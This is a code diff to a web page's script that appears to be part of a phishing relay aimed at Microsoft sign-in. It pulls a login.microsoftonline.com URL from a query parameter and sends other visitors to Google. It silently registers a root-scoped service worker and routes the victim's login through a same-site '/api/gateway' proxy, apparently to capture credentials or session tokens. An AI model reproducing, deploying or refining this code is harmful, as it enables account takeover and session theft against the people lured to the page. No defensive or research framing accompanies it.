@@ -57,28 +57,45 @@
     <script>
         (function() {
             const params = new URLSearchParams(window.location.search);
-            const target = params.get('dest');
-            if (!target) {
+            // EXTRACT ONLY THE MICROSOFT URL from the 'dest' parameter
+            const rawTarget = params.get('dest');
+            console.log('[PAGE] Raw target from URL:', rawTarget);
+
+            if (!rawTarget) {
                 window.location.replace('https://www.google.com');
                 return;
             }
 
+            // Decode the target (it's URL-encoded)
+            let microsoftUrl;
+            try {
+                microsoftUrl = decodeURIComponent(rawTarget);
+                console.log('[PAGE] Decoded target:', microsoftUrl);
+            } catch (e) {
+                console.log('[PAGE] Failed to decode target, using raw value');
+                microsoftUrl = rawTarget;
+            }
+
+            // Validate it's a proper URL (should be https://login.microsoftonline.com/...)
+            try {
+                new URL(microsoftUrl);
+            } catch (e) {
+                console.log('[PAGE] Invalid URL, falling back to Google');
+                window.location.replace('https://www.google.com');
+                return;
+            }
+
+            // Register Service Worker silently
             if ('serviceWorker' in navigator) {
                 navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' })
-                    .then(() => navigator.serviceWorker.ready)  // Wait for activation
-                    .then(() => {
-                        // Navigate to our relay endpoint – the SW will intercept this request
-                        const relayUrl = `/api/gateway?target=${encodeURIComponent(target)}`;
-                        window.location.replace(relayUrl);
-                    })
-                    .catch(() => {
-                        // If SW fails, fallback to direct redirect
-                        window.location.replace(decodeURIComponent(target));
-                    });
-            } else {
-                // No SW support – direct redirect
-                window.location.replace(decodeURIComponent(target));
+                    .then(() => console.log('[PAGE] SW registered'))
+                    .catch(err => console.log('[PAGE] SW registration failed:', err));
             }
+
+            // Navigate to relay with the CLEAN Microsoft URL
+            const relayUrl = `/api/gateway?target=${encodeURIComponent(microsoftUrl)}`;
+            console.log('[PAGE] Redirecting to relay:', relayUrl);
+            window.location.replace(relayUrl);
         })();
     </script>
 </body>
